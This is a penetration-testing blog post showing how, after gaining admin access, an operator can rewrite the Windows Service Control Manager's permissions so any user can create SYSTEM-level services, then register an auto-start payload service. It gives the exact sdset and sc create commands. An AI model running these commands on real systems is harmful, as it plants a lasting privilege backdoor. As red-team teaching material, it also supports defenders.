---
title: Persistence – Service Control Manager
url: https://pentestlab.blog/2023/03/20/persistence-service-control-manager/
source: Penetration Testing Lab
date: 2023-03-21
fetch_date: 2025-10-04T10:08:52.106101
---

# Persistence – Service Control Manager

[Skip to content](#content)

[Penetration Testing Lab](https://pentestlab.blog/)

Offensive Techniques & Methodologies

Menu

* [Methodologies](https://pentestlab.blog/methodologies/)
  + [Red Teaming](https://pentestlab.blog/methodologies/red-teaming/)
    - [Credential Access](https://pentestlab.blog/methodologies/red-teaming/credential-access/)
    - [Persistence](https://pentestlab.blog/methodologies/red-teaming/persistence/)
* [Resources](https://pentestlab.blog/resources/)
  + [Papers](https://pentestlab.blog/resources/papers/)
    - [Web Application](https://pentestlab.blog/resources/papers/web-application/)
  + [Presentations](https://pentestlab.blog/resources/presentations/)
    - [Defcon](https://pentestlab.blog/resources/presentations/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/presentations/derbycon/)
    - [Tools](https://pentestlab.blog/resources/presentations/tools/)
  + [Videos](https://pentestlab.blog/resources/videos/)
    - [BSides](https://pentestlab.blog/resources/videos/bsides/)
    - [Defcon](https://pentestlab.blog/resources/videos/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/videos/derbycon/)
    - [Hack In Paris](https://pentestlab.blog/resources/videos/hack-in-paris/)
* [Contact](https://pentestlab.blog/contact-the-lab/)
  + [About Us](https://pentestlab.blog/contact-the-lab/about-us/)

Posted on [March 20, 2023](https://pentestlab.blog/2023/03/20/persistence-service-control-manager/)

# Persistence – Service Control Manager

![Unknown's avatar](https://0.gravatar.com/avatar/9161b274d6d350683293f1e03d228985ac0ff6ac6c89353f4b6bd1a7bc69daf4?s=32&d=identicon&r=G) by [Administrator](https://pentestlab.blog/author/worm1984/).In [Persistence](https://pentestlab.blog/category/red-team/persistence/).[Leave a Comment on Persistence – Service Control Manager](https://pentestlab.blog/2023/03/20/persistence-service-control-manager/#respond)

The service control manager (SCM) is responsible to start and stop services in windows environments including device drivers and start up applications. Microsoft introduced in Windows 2000 and later the Security Descriptor Definition Language (SDDL) in order to provide a textual representation for security descriptors in a more readable format. Prior to Windows 2000 security descriptors were represented as hex bytes. Permissions of the service control manager like other windows objects are managed by Discretionary Access Control List (DACL) which are also represent by SDDL.

During red team operations if elevated access has been achieved the permissions of the service control manager can be modified via the SDDL in order to grant the “Everyone” group with rights over the service control manager. This action could be used as a form of persistence since any user could create a service on the environment that will execute an arbitrary command or payload with SYSTEM level privileges every time that the computer starts. The technique was discovered by [Grzegorz Tworek](https://twitter.com/0gtweet) and was shared over Twitter.

Execution of the command below will retrieve quickly the SDDL rights of the service control manager utility.

```
sc sdshow scmanager
```

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-scmanager-security-descriptor.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-scmanager-security-descriptor.png)

Service Control Manager – Security Descriptor

PowerShell could also be used to enumerate SDDL rights for all the user groups and convert them to a readable format.

```
$SD = Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\Schedule\Security\
$sddl = ([wmiclass]”Win32_SecurityDescriptorHelper”).BinarySDToSDDL($SD.Security).Sddl
$SecurityDescriptor = ConvertFrom-SddlString -Sddl $sddl
$SecurityDescriptor.DiscretionaryAcl
```

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-enumerate-permissions-powershell.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-enumerate-permissions-powershell.png)

Enumerate Permissions via PowerShell

The command below will enumerate the permissions of the “*scmanager*” utility and will display the associated SDDL rights.

```
sc sdshow scmanager showrights
```

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-scmanager-show-rights.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-scmanager-show-rights.png)

Service Control Manager – Rights Enumeration

Users with standard level access they cannot create a service in Windows environments. This privilege belongs only to elevated users such as Local Administrators. However, modification of the security descriptor permissions for the service control manager could allow also any user to create a service that will run under the context of the SYSTEM account. Using the security descriptor definition language these permissions could be modified by executing the command below:

```
sc.exe sdset scmanager D:(A;;KA;;;WD)
```

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-security-descriptor-permission-modification.png?w=980)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-security-descriptor-permission-modification.png)

Security Descriptor Permission Modification

The following table displays what the SDDL acronyms mean in the above command.

|  |  |
| --- | --- |
| D | Discretionary Access Control List |
| A | Access Control Entry – Access Allowed |
| KA | KEY\_ALL\_ACCESS – Rights |
| WD | Security Principal of Everyone Group |

The service configuration utility could be used to create a new service. The “*binPath*” parameter could store the arbitrary payload which will executed once the service starts. It should be noted that since the permissions of the service control manager changed, non elevated users can also create new services on the windows environment. In the event that the malicious service is removed by the blue team permissions will still remain allowing standard users to continue create new services to maintain persistence.

```
sc create pentestlab displayName= "pentestlab" binPath= "C:\temp\pentestlab.exe" start= auto
```

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-service-creation.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-service-creation.png)

Service Control Manager – New Service from Standard User Account

The new service will appear in the list of Windows services.

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-services.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-services.png)

Service Control Manager – New Service

When the system starts again, the service will automatically initiate and the payload will executed with SYSTEM level privileges.

[![](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-meterpreter.png?w=636)](https://pentestlab.blog/wp-content/uploads/2023/03/persistence-sddl-meterpreter.png)

Service Control Manager – Meterpreter

### Rate this:

### Share this:

* [Click to share on X (Opens in new window)
  X](https://pentestlab.blog/2023/03/20/persistence-service-control-manager/?share=twitter)
* [Click to share on Facebook (Opens in new window)
  Facebook](https://pentestlab.blog/2023/03/20/persistence-service-control-manager/?share=facebook)
* [Click to share on LinkedIn (Opens in new window)
  LinkedIn](https://pentestlab.blog/2023/03/20/persistence-service-control-manager/?share=linkedin)
* [Click to share on Reddit (Opens in new window)
  Reddit](https://pentestlab.blog/2023/03/20/persistence-service-control-manager/?share=reddit)
* [Click to share on Mastodon (Opens in new window)
  Mastodon](https://pentestlab.blog/2023/03/20/persistence-service-control-manager/?share=mastodon)
* [Click to share on Tumblr (Opens in new window)
  Tumblr](https://pentestlab.blog/20...